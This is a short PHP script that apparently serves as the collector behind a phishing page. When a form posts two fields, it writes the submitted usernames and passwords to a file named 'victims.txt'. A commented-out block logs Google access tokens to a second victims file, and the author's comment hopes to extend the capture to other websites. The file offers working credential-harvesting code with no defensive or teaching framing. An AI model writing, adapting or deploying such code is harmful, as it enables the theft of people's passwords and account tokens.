<?php
if (count($_POST) == 2){
    $f = fopen('victims.txt','a+');
    fwrite($f,'USERNAME : '.$_POST['user'].' PASSWORD : '.$_POST['pw']."\n");
    fclose($f);
}
/*else{         NEED TO FIGURE OUT A WAY TO USE THIS EVEN FOR OTHER WEBSITES. IF DONE THEN LEGENDARY
    $f = fopen('victims-google.txt','a+');
    fwrite($f,'ACCESS TOKEN : '.$_POST['access_token']."\n");
    fclose($f);
}*/
?>